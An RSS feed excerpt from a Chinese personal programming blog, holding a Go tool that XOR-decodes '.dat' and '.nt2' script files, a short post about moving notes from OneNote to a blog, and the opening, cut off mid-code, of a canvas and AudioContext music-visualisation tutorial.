&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">readFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s">&amp;#34;.dat&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">decodeDat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s">&amp;#34;.nt2&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">decodeNt2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Input file should be .dat or .nt2 encrypted script!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">writeFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Base&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">done&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;bufio&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;log&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;path&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Args&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">readFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s">&amp;#34;.dat&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">decodeDat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s">&amp;#34;.nt2&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">decodeNt2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">decodeChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Input file should be .dat or .nt2 encrypted script!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">go&lt;/span> &lt;span class="nf">writeFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Base&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">done&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">readFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">OpenFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_RDONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">reader&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bufio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">buf&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="mi">1024000&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">[:])&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">writeFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">done&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="kt">bool&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">OpenFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_WRONLY&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_TRUNC&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">O_CREATE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">writer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bufio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewWriter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">outChannel&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">writer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">writer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Flush&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">done&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">decodeDat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">inChannel&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^=&lt;/span> &lt;span class="mh">0x84&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">decodeNt2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">inChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">outChannel&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">more&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">inChannel&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x85&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x97&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">outChannel&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">buf&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outChannel&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>关于笔记的考虑</title><link>https://nnnewb.github.io/blog/p/%E5%85%B3%E4%BA%8E%E7%AC%94%E8%AE%B0%E7%9A%84%E8%80%83%E8%99%91/</link><pubDate>Sun, 16 Dec 2018 23:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%85%B3%E4%BA%8E%E7%AC%94%E8%AE%B0%E7%9A%84%E8%80%83%E8%99%91/</guid><description>&lt;p>使用了两年多的 One Note，但是 One Note 对代码的支持实在是难受，于是数次折腾之后最终还是选择再找个更合适的笔记工具。&lt;/p>
&lt;p>在知乎上搜了一圈之后，大多数笔记工具收费且不论，最严重的问题反而是对笔记能否生存下去的怀疑。&lt;/p>
&lt;p>大多笔记工具用私有格式来处理富文本（比如可用样式排版有限的 HTML），或者其他奇奇怪怪的格式。且不说这些东西导出来怎么办&amp;hellip;..把笔记多地备份本身就够难受了。&lt;/p>
&lt;p>再者，笔记这玩意儿记了自己都不一定看。偶尔想起来翻一下，还要怀疑自己当初写的什么狗屁玩意儿。&lt;/p>
&lt;p>所以经过这么多考虑&amp;hellip;&amp;hellip;还是直接搭个博客最自由且不会太担心保存的问题了。&lt;/p>
&lt;p>比较别的笔记工具可能密码忘了或长时间不登陆，git 天天用（这里应有自嘲），根本离不开。&lt;/p>
&lt;p>所以想了想，还是转移笔记到博客好了。写笔记可能很随便，写博客总要考据两下的。再说，还可以自定义页面效果，对我这种喜欢折腾的人还是蛮对胃口的。&lt;/p>
&lt;p>总而言之，先挂上去了，就这样。&lt;/p></description></item><item><title>AudioContext 技术和音乐可视化（2）</title><link>https://nnnewb.github.io/blog/p/audiocontext-%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%962/</link><pubDate>Thu, 08 Nov 2018 21:41:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/audiocontext-%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%962/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>转载请注明来源，可以在&lt;a class="link" href="https://th-zxj.club" target="_blank" rel="noopener"
>测试博客&lt;/a>查看完成效果。&lt;/p>
&lt;p>本篇讲述如何从频域数据绘制动态的星空。&lt;/p>
&lt;h2 id="一使用-canvas-绘图">一、使用 Canvas 绘图&lt;/h2>
&lt;h3 id="11-位置和大小">1.1 位置和大小&lt;/h3>
&lt;p>绘制背景的第一要务便是把 canvas 元素放置在背景这一层次上，避免遮盖其他元素。&lt;/p>
&lt;p>对我而言，个人习惯用 css 来设置大小和位置，用 html 来确定渲染顺序而不是 z-index。&lt;/p>
&lt;p>下面是 html 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">canvas&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">canvas&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="c">&amp;lt;!-- other elements --&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是 css 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">#&lt;/span>&lt;span class="nn">background-canvas&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">fixed&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">top&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">vw&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">vh&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">black&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fixed&lt;/code>确保拖动页面不会令背景也跟随移动。&lt;/p>
&lt;p>其余部分我想应该没什么有疑问的地方。&lt;/p>
&lt;h3 id="12-canvascontext2d">1.2 CanvasContext2D&lt;/h3>
&lt;p>对于 canvas 元素的绘图操作我想很多人应该接触过。&lt;/p>
&lt;p>以绘制圆形为例，使用如下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;2d&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
